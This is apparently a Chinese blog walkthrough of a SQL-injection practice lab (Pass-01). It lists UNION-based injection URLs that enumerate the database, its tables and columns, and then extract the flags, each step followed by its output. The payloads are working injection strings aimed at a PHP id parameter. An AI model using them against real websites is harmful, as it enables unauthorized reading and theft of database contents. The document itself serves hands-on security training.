---
layout: post
title: template page
categories: [cate1, cate2]
description: some word here
keywords: keyword1, keyword2
---

# 掌控安全 SQL 注入靶场练习 Pass1 - 报错注入

靶场地址:  http://injectx1.lab.aqlab.cn:81/Pass-01/index.php?id=1

> **注意**: 错误注入 不一定是会返回错误信息。 也指不正常显示结果， 例如此题的查询为空。

## 0x01 准备工具


辅助工具 `google extension` : hackbar

1. 帮助快速构造语句
2. 显示原始字符，免去 urlcode 烦恼


## 0x02 开始

```sql
-- 1. 查询数据库名
http://injectx1.lab.aqlab.cn:81/Pass-01/index.php?id=1 and 1=2 union select 1,2, database()
-- error


-- 2. 查询所以表名
http://injectx1.lab.aqlab.cn:81/Pass-01/index.php?id=1 and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()
-- error_flag, user


-- 3. 查询当前库所有列名
http://injectx1.lab.aqlab.cn:81/Pass-01/index.php?id=1 and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name='error_flag'
-- id, flag

-- 4.0 查询 flag 数量
http://injectx1.lab.aqlab.cn:81/Pass-01/index.php?id=1 and 1=2 union select 1,2,count(*) from error_flag
-- 4


-- 4.1 查询 flag
http://injectx1.lab.aqlab.cn:81/Pass-01/index.php?id=1 and 1=2 union select 1,id,flag from error_flag
-- zKaQ-Nf

-- 4.2 查询所有flag
http://injectx1.lab.aqlab.cn:81/Pass-01/index.php?id=1 and 1=2 union select 1,2,group_concat(flag) from error_flag
-- zKaQ-Nf,zKaQ-BJY,zKaQ-XiaoFang,zKaq-98K

```
